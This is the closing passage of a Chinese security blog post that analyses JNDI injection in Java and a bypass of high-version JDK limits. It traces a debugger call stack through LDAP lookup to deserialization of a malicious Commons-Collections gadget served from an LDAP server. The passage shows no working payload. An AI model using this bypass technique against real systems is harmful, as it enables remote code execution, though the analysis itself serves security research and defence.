<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">decodeObject:235, Obj (com.sun.jndi.ldap)</span><br><span class="line">c_lookup:1051, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:94, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">main:7, Test</span><br></pre></td></tr></table></figure>
<p>前面的函数调用链都是不同类lookup()函数之间的调用，com.sun.jndi.ldap.LdapCtx类的c_lookup()函数中会调用到com.sun.jndi.ldap.Obj类的decodeObject()函数进行解码对象的操作。</p>
<p>跟进去，先调用getCodebases()函数从JAVA_ATTRIBUTES中取出索引为4即javaCodeBase的内容，由于本次并没有设置这个属性因此返回null即下面Variables框中的var1(slot_2)变量；然后从JAVA_ATTRIBUTES中取出索引为1即javaSerializedData的内容，这个我们是在恶意LDAP服务端中设置了的、内容就是恶意的Commons-Collections这个Gadget的恶意利用序列化对象字节流，对应的是下面Variables框中的var2 (slot_1)变量；这里var1(slot_2)变量为null，传入getURLClassLoader()函数调用后返回的是AppClassLoader即应用类加载器；再往下就是调用deserializeObject()函数来反序列化javaSerializedData的对象字节码：</p>
<p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/4.png" alt=""></p>
<p>其中静态变量JAVA_ATTRIBUTES的内容如下：</p>
<p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/5.png" alt=""></p>
<p>跟进函数中，就是熟悉的老朋友readObject()了，原生的Java反序列化漏洞就能触发了：</p>
<p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/6.png" alt=""></p>
<p>我们回到decodeObject()函数调用的getURLClassLoader()函数中，这是之前使用LDAP+Reference的方式被高版本JDK限制无法利用的地方。跟进去看看：</p>
<p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/7.png" alt=""></p>
<p>入参var1是javaCodeBase项设置的内容，由于未设置该项因此直接返回var2变量即AppClassLoader应用类加载器实例。这里看到，如果我们使用LDAP+Reference的方式进行利用的话，是需要设置javaCodeBase项的，此时var1就不为null、满足第一个判断条件，但是第二个条件<code>&quot;true&quot;.equalsIgnoreCase(trustURLCodebase)</code>在高版本JDK中是默认不成立的，即trustURLCodebase值默认为false，因此之前的LDAP+Reference就不能利用了。</p>
<h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener">如何绕过高版本JDK的限制进行JNDI注入利用</a></p>
<p><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener">Exploiting JNDI Injections in Java</a></p>

    </div>

  </article>
  <div class="toc-container">
    
  <div id="toc" class="toc-article">
    <strong class="toc-title">目录</strong>
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-调试分析高低版JDK下的JNDI注入"><span class="toc-text">0x01 调试分析高低版JDK下的JNDI注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RMI"><span class="toc-text">RMI</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#低版本"><span class="toc-text">低版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#高版本"><span class="toc-text">高版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#修补点源码对比"><span class="toc-text">修补点源码对比</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP"><span class="toc-text">LDAP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#低版本-1"><span class="toc-text">低版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#高版本-1"><span class="toc-text">高版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#修补点源码对比-1"><span class="toc-text">修补点源码对比</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-绕过高版本JDK（8u191-）限制"><span class="toc-text">0x02 绕过高版本JDK（8u191+）限制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用本地恶意Class作为Reference-Factory"><span class="toc-text">利用本地恶意Class作为Reference Factory</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#攻击利用"><span class="toc-text">攻击利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#几种变体的表达式"><span class="toc-text">几种变体的表达式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#调试分析"><span class="toc-text">调试分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#小结"><span class="toc-text">小结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用LDAP返回序列化数据，触发本地Gadget"><span class="toc-text">利用LDAP返回序列化数据，触发本地Gadget</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#攻击利用-1"><span class="toc-text">攻击利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#调试分析-1"><span class="toc-text">调试分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-参考"><span class="toc-text">0x03 参考</span></a></li></ol>
  </div>


  </div>
</div>
<div class="copyright">
    <span>本作品采用</span>
    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
    <span>进行许可。 转载时请注明原文链接。</span>
</div>


  
    <div class="post-nav">
      <div class="post-nav-item post-nav-next">
        
          <span>〈 </span>
          <a href="/2020/09/04/BurpExtender开发之CSRF-PoC生成器/" rel="next" title="BurpExtender开发之CSRF PoC生成器">
          BurpExtender开发之CSRF PoC生成器
          </a>
        
      </div>
  
      <div class="post-nav-item post-nav-prev">
          
          <a href="/2020/09/15/浅析phpunit之CVE-2017-9841/" rel="prev" title="浅析phpunit之CVE-2017-9841">
            浅析phpunit之CVE-2017-9841
          </a>
          <span>〉</span>
        
      </div>
    </div>
  


    </div>

    
    

  </div>
  <footer class="footer text-center">
    <div id="bottom-inner">
        <span>Copyright &copy; Mi1k7ea</span>  |  
        <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
        <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
    </div>
</footer>

  

<script>
  (function(window, document, undefined) {

    var timer = null;

    function returnTop() {
      cancelAnimationFrame(timer);
      timer = requestAnimationFrame(function fn() {
        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
        if (oTop > 0) {
          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
          timer = requestAnimationFrame(fn);
        } else {
          cancelAnimationFrame(timer);
        }
      });
    }

    var hearts = [];
    window.requestAnimationFrame = (function() {
      return window.requestAnimationFrame ||
        window.webkitRequestAnimationFrame ||
        window.mozRequestAnimationFrame ||
        window.oRequestAnimationFrame ||
        window.msRequestAnimationFrame ||
        function(callback) {
          setTimeout(callback, 1000 / 60);
        }
    })();
    init();

    function init() {
      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
      attachEvent();
      gameloop();
      addMenuEvent();
    }

    function gameloop() {
      for (var i = 0; i < hearts.length; i++) {
        if (hearts[i].alpha <= 0) {
          document.body.removeChild(hearts[i].el);
          hearts.splice(i, 1);
          continue;
        }
        hearts[i].y--;
        hearts[i].scale += 0.004;
        hearts[i].alpha -= 0.013;
        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
      }
      requestAnimationFrame(gameloop);
    }

    /**
     * 给logo设置点击事件
     * 
     * - 回到顶部
     * - 出现爱心
     */
    function attachEvent() {
      var old = typeof window.onclick === "function" && window.onclick;
      var logo = document.getElementById("logo");
      if (logo) {
        logo.onclick = function(event) {
          returnTop();
          old && old();
          createHeart(event);
        }
      }
      
    }

    function createHeart(event) {
      var d = document.createElement("div");
      d.className = "heart";
      hearts.push({
        el: d,
        x: event.clientX - 5,
        y: event.clientY - 5,
        scale: 1,
        alpha: 1,
        color: randomColor()
      });
      document.body.appendChild(d);
    }

    function css(css) {
      var style = document.createElement("style");
      style.type = "text/css";
      try {
        style.appendChild(document.createTextNode(css));
      } catch (ex) {
        style.styleSheet.cssText = css;
      }
      document.getElementsByTagName('head')[0].appendChild(style);
    }

    function randomColor() {
      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
      return "#F44336";
    }

    function addMenuEvent() {
      var menu = document.getElementById('menu-main-post');
      if (menu) {
        var toc = document.getElementById('toc');
        if (toc) {
          menu.onclick = function() {
            if (toc) {
              if (toc.style.display == 'block') {
                toc.style.display = 'none';
              } else {
                toc.style.display = 'block';
              }
            }
          };
        } else {
          menu.style.display = 'none';
        }
      }
    }

  })(window, document);
</script>

  



  
<script>
  (function(){
      var bp = document.createElement('script');
      var curProtocol = window.location.protocol.split(':')[0];
      if (curProtocol === 'https') {
          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
      }
      else {
          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
      }
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(bp, s);
  })();
</script>


</body>
</html>
